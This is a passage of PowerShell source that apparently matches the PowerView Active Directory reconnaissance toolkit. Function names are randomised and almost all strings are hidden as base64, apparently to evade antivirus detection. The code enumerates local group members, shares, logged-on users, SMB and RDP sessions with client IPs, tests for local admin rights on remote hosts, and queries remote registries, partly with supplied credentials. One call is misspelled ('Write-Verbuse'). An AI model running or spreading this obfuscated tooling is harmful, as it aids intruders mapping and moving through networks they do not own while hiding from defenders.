                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))) $Server
                        $AdsPath = ($_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAHMAcABhAHQAaAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null)).Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvAA=='))), '')
                        $Name = PlangintsSubrierTernes -ObjectName $AdsPath
                        if($Name) {
                            $FQDN = $Name.split("/")[0]
                            $ObjName = $AdsPath.split("/")[-1]
                            $Name = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABGAFEARABOAC8AJABPAGIAagBOAGEAbQBlAA==')))
                            $IsDomain = $True
                        }
                        else {
                            $Name = $AdsPath
                            $IsDomain = $False
                        }
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Name
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null),0)).Value)
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) $( if(-not $IsDomain) { try { $_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABEAGkAcwBhAGIAbABlAGQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null) } catch { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBSAFIATwBSAA=='))) } } else { $False } )
                        $IsGroup = ($_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $IsGroup
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $IsDomain
                        if($IsGroup) {
                            $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ""
                        }
                        else {
                            try {
                                $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ( $_.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $_, $Null))
                            }
                            catch {
                                $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ""
                            }
                        }
                        $Member
                        if($Recurse -and $IsDomain -and $IsGroup) {
                            $FQDN = $Name.split("/")[0]
                            $GroupName = $Name.split("/")[1].trim()
                            EspeiPersBathly -GroupName $GroupName -Domain $FQDN -FullData -Recurse | % {
                                $Member = New-Object PSObject
                                $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))) ("$FQDN/{0}" -f $($_.GroupName))
                                $MemberDN = $_.distinguishedName
                                $MemberDomain = $MemberDN.subString($MemberDN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                                if ($_.samAccountType -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA')))) {
                                    $MemberIsGroup = $True
                                }
                                else {
                                    $MemberIsGroup = $False
                                }
                                if ($_.samAccountName) {
                                    $MemberName = $_.samAccountName
                                }
                                else {
                                    try {
                                        try {
                                            $MemberName = ElminutColatCably $_.cn
                                        }
                                        catch {
                                            $MemberName = $_.cn
                                        }
                                    }
                                    catch {
                                        Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABTAEkARAAgADoAIAAkAF8A')))
                                    }
                                }
                                $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABNAGUAbQBiAGUAcgBEAG8AbQBhAGkAbgAvACQATQBlAG0AYgBlAHIATgBhAG0AZQA=')))
                                $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) $_.objectsid
                                $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) $False
                                $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $MemberIsGroup
                                $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
                                $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ''
                                $Member
                            }
                        }
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
            }
        }
    }
}
function AglimHigedMetries {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        $ComputerName = InfeerismAltersDitronite -Object $ComputerName
        $QueryLevel = 1
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0
        $Result = $Netapi32::NetShareEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
        $Offset = $PtrInfo.ToInt64()
        Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBOAGUAdABTAGgAYQByAGUAIAByAGUAcwB1AGwAdAA6ACAAJABSAGUAcwB1AGwAdAA=')))
        if (($Result -eq 0) -and ($Offset -gt 0)) {
            $Increment = $SHARE_INFO_1::GetSize()
            for ($i = 0; ($i -lt $EntriesRead); $i++) {
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $SHARE_INFO_1
                $Info | select *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $Increment
            }
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB1AHMAZQByACAAZABvAGUAcwAgAG4AbwB0ACAAaABhAHYAZQAgAGEAYwBjAGUAcwBzACAAdABvACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAA==')))}
                (124)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB2AGEAbAB1AGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGYAbwByACAAdABoAGUAIABsAGUAdgBlAGwAIABwAGEAcgBhAG0AZQB0AGUAcgAgAGkAcwAgAG4AbwB0ACAAdgBhAGwAaQBkAC4A')))}
                (87)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAHAAYQByAGEAbQBlAHQAZQByACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (234)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAGUAbgB0AHIAaQBlAHMAIABhAHIAZQAgAGEAdgBhAGkAbABhAGIAbABlAC4AIABTAHAAZQBjAGkAZgB5ACAAYQAgAGwAYQByAGcAZQAgAGUAbgBvAHUAZwBoACAAYgB1AGYAZgBlAHIAIAB0AG8AIAByAGUAYwBlAGkAdgBlACAAYQBsAGwAIABlAG4AdAByAGkAZQBzAC4A')))}
                (8)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGkAcwAgAGEAdgBhAGkAbABhAGIAbABlAC4A')))}
                (2312)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHMAZQBzAHMAaQBvAG4AIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQAIAB3AGkAdABoACAAdABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlAC4A')))}
                (2351)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (2221)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlACAAbgBvAHQAIABmAG8AdQBuAGQALgA=')))}
                (53)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABmAG8AdQBuAGQA')))}
            }
        }
    }
}
function IlpnGynerCharme {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        $ComputerName = InfeerismAltersDitronite -Object $ComputerName
        $QueryLevel = 1
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0
        $Result = $Netapi32::NetWkstaUserEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
        $Offset = $PtrInfo.ToInt64()
        Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBOAGUAdABMAG8AZwBnAGUAZABvAG4AIAByAGUAcwB1AGwAdAA6ACAAJABSAGUAcwB1AGwAdAA=')))
        if (($Result -eq 0) -and ($Offset -gt 0)) {
            $Increment = $WKSTA_USER_INFO_1::GetSize()
            for ($i = 0; ($i -lt $EntriesRead); $i++) {
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $WKSTA_USER_INFO_1
                $Info | select *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $Increment
            }
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB1AHMAZQByACAAZABvAGUAcwAgAG4AbwB0ACAAaABhAHYAZQAgAGEAYwBjAGUAcwBzACAAdABvACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAA==')))}
                (124)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB2AGEAbAB1AGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGYAbwByACAAdABoAGUAIABsAGUAdgBlAGwAIABwAGEAcgBhAG0AZQB0AGUAcgAgAGkAcwAgAG4AbwB0ACAAdgBhAGwAaQBkAC4A')))}
                (87)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAHAAYQByAGEAbQBlAHQAZQByACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (234)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAGUAbgB0AHIAaQBlAHMAIABhAHIAZQAgAGEAdgBhAGkAbABhAGIAbABlAC4AIABTAHAAZQBjAGkAZgB5ACAAYQAgAGwAYQByAGcAZQAgAGUAbgBvAHUAZwBoACAAYgB1AGYAZgBlAHIAIAB0AG8AIAByAGUAYwBlAGkAdgBlACAAYQBsAGwAIABlAG4AdAByAGkAZQBzAC4A')))}
                (8)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGkAcwAgAGEAdgBhAGkAbABhAGIAbABlAC4A')))}
                (2312)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHMAZQBzAHMAaQBvAG4AIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQAIAB3AGkAdABoACAAdABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlAC4A')))}
                (2351)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (2221)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlACAAbgBvAHQAIABmAG8AdQBuAGQALgA=')))}
                (53)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABmAG8AdQBuAGQA')))}
            }
        }
    }
}
function MastrusWheepUnpers {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',
        [String]
        $UserName = ''
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        $ComputerName = InfeerismAltersDitronite -Object $ComputerName
        $QueryLevel = 10
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0
        $Result = $Netapi32::NetSessionEnum($ComputerName, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
        $Offset = $PtrInfo.ToInt64()
        Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBOAGUAdABTAGUAcwBzAGkAbwBuACAAcgBlAHMAdQBsAHQAOgAgACQAUgBlAHMAdQBsAHQA')))
        if (($Result -eq 0) -and ($Offset -gt 0)) {
            $Increment = $SESSION_INFO_10::GetSize()
            for ($i = 0; ($i -lt $EntriesRead); $i++) {
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $SESSION_INFO_10
                $Info | select *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $Increment
            }
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB1AHMAZQByACAAZABvAGUAcwAgAG4AbwB0ACAAaABhAHYAZQAgAGEAYwBjAGUAcwBzACAAdABvACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAA==')))}
                (124)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB2AGEAbAB1AGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGYAbwByACAAdABoAGUAIABsAGUAdgBlAGwAIABwAGEAcgBhAG0AZQB0AGUAcgAgAGkAcwAgAG4AbwB0ACAAdgBhAGwAaQBkAC4A')))}
                (87)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAHAAYQByAGEAbQBlAHQAZQByACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (234)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAGUAbgB0AHIAaQBlAHMAIABhAHIAZQAgAGEAdgBhAGkAbABhAGIAbABlAC4AIABTAHAAZQBjAGkAZgB5ACAAYQAgAGwAYQByAGcAZQAgAGUAbgBvAHUAZwBoACAAYgB1AGYAZgBlAHIAIAB0AG8AIAByAGUAYwBlAGkAdgBlACAAYQBsAGwAIABlAG4AdAByAGkAZQBzAC4A')))}
                (8)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGkAcwAgAGEAdgBhAGkAbABhAGIAbABlAC4A')))}
                (2312)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHMAZQBzAHMAaQBvAG4AIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQAIAB3AGkAdABoACAAdABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlAC4A')))}
                (2351)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (2221)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlACAAbgBvAHQAIABmAG8AdQBuAGQALgA=')))}
                (53)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABmAG8AdQBuAGQA')))}
            }
        }
    }
}
function LencismLencyHemen {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        $ComputerName = InfeerismAltersDitronite -Object $ComputerName
        $Handle = $Wtsapi32::WTSOpenServerEx($ComputerName)
        if ($Handle -ne 0) {
            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBUAFMATwBwAGUAbgBTAGUAcgB2AGUAcgBFAHgAIABoAGEAbgBkAGwAZQA6ACAAJABIAGEAbgBkAGwAZQA=')))
            $ppSessionInfo = [IntPtr]::Zero
            $pCount = 0
            $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount)
            $Offset = $ppSessionInfo.ToInt64()
            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBUAFMARQBuAHUAbQBlAHIAYQB0AGUAUwBlAHMAcwBpAG8AbgBzAEUAeAAgAHIAZQBzAHUAbAB0ADoAIAAkAFIAZQBzAHUAbAB0AA==')))
            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABDAG8AdQBuAHQAOgAgACQAcABDAG8AdQBuAHQA')))
            if (($Result -ne 0) -and ($Offset -gt 0)) {
                $Increment = $WTS_SESSION_INFO_1::GetSize()
                for ($i = 0; ($i -lt $pCount); $i++) {
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WTS_SESSION_INFO_1
                    $RDPSession = New-Object PSObject
                    if ($Info.pHostName) {
                        $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Info.pHostName
                    }
                    else {
                        $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                    }
                    $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))) $Info.pSessionName
                    if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                        $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ("{0}" -f $($Info.pUserName))
                    }
                    else {
                        $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ("{0}\{1}" -f $($Info.pDomainName), $($Info.pUserName))
                    }
                    $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                    $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))) $Info.State
                    $ppBuffer = [IntPtr]::Zero
                    $pBytesReturned = 0
                    $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned)
                    $Offset2 = $ppBuffer.ToInt64()
                    $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                    $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS
                    $SourceIP = $Info2.Address       
                    if($SourceIP[2] -ne 0) {
                        $SourceIP = [String]$SourceIP[2]+"."+[String]$SourceIP[3]+"."+[String]$SourceIP[4]+"."+[String]$SourceIP[5]
                    }
                    else {
                        $SourceIP = $Null
                    }
                    $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUASQBQAA=='))) $SourceIP
                    $RDPSession
                    $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)
                    $Offset += $Increment
                }
                $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
            }
            $Null = $Wtsapi32::WTSCloseServer($Handle)
        }
        else {
            $Err = $Kernel32::GetLastError()
            Write-Verbuse $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABFAHIAcgBvAHIAOgAgACQARQByAHIA')))
        }
    }
}
function BoryStastwaySegrous {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]
        $ComputerName = 'localhost'
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        $ComputerName = InfeerismAltersDitronite -Object $ComputerName
        $Handle = $Advapi32::OpenSCManagerW($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F)
        Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBDAGgAZQBjAGsATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwAgAGgAYQBuAGQAbABlADoAIAAkAEgAYQBuAGQAbABlAA==')))
        if ($Handle -ne 0) {
            $Null = $Advapi32::CloseServiceHandle($Handle)
            $True
        }
        else {
            $Err = $Kernel32::GetLastError()
            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBDAGgAZQBjAGsATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwAgAEwAYQBzAHQARQByAHIAbwByADoAIAAkAEUAcgByAA==')))
            $False
        }
    }
}
function SemicBedSerously {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]        
        $ComputerName = "."
    )
    process {
        $ComputerName = InfeerismAltersDitronite -Object $ComputerName
        try {
            $Reg = [WMIClass]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXAByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AHMAdABkAFIAZQBnAFAAcgBvAHYA')))
            $HKLM = 2147483650
            $Key = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQA=')))
            $Value = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA=')))
            $Reg.GetStringValue($HKLM, $Key, $Value).sValue
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAIABvAHAAZQBuAGkAbgBnACAAcgBlAG0AbwB0AGUAIAByAGUAZwBpAHMAdAByAHkAIABvAG4AIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAC4AIABSAGUAbQBvAHQAZQAgAHIAZQBnAGkAcwB0AHIAeQAgAGwAaQBrAGUAbAB5ACAAbgBvAHQAIABlAG4AYQBiAGwAZQBkAC4A')))
            $Null
        }
    }
}
function EnvityKinehoodGnu {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName = "localhost",
        [String]
        $RemoteUserName,
        [String]
        $RemotePassword
    )
    begin {
        if ($RemoteUserName -and $RemotePassword) {
            $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)
        }
        $HKU = 2147483651
    }
    process {
        try {
            if($Credential) {
                $Reg = Get-Wmiobject -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername $ComputerName -Credential $Credential -ErrorAction SilentlyContinue
            }
            else {
                $Reg = Get-Wmiobject -List $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Namespace root\default -Computername $ComputerName -ErrorAction SilentlyContinue
            }
        }
        catch {
